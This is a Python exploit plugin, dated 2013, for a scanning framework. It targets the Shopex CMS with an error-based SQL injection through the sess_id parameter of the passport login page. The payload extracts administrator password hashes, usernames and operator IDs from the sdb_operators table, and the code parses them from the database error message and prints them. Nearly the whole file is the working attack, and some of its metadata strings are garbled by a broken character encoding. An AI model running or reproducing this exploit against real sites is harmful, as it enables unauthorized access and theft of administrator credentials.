# -*- coding:utf-8 -*-
class NSSPlugin:
    '''Shopex sqlinject'''
    infos = [
        ['���','Shopex sessid SqlInject Exp'],
        ['����','teamtopkarl'],
        ['����','2013/10/24'],
        ['��ַ','http://www.21hn.net']
        ]
    opts  = [
        ['RURL','www.xxxxxxx.com','Ŀ��URL'],
        ['RPATH','/shopadmin/','CMS·��'],
        ['RPORT','80','Ŀ��˿�'],
        ['PAYLOAD','false',"����Ҫ�󹥻����"]
        ]
    def exploit(self):
        '''start exploit'''
        if RPORT == '443':
            url = 'https://%s%s'%(RURL,RPATH)
        else:
            url = 'http://%s:%s%s'%(RURL,RPORT,RPATH)
        exp = url+"index.php?ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'='1"
        pp.prettyPrint("[*] Sending exp..",YELLOW)
        ok  = exploitModule.urlGET(exp)
        if ok.getcode() == 200:
            tmp = exploitModule.find(r"(Duplicate entry ')(.{32})~(.*)~(\d*)(' for key 'group_key')",ok.read())
            if len(tmp)>0:
                pp.prettyPrint("[*] Exploit Successful !",GREEN)
                i = 1
                for res in tmp:
                    res = res[1:len(res)-1]
                    pp.prettyPrint("[%s] %s"%(i,res),GREEN)
                    i += 1
            else:
                pp.prettyPrint("[!] TARGET NO VULNERABLE !",RED)
        else:
            pp.prettyPrint("[!] EXPLOIT FALSE ! CODE:%s"%ok.getcode(),RED)
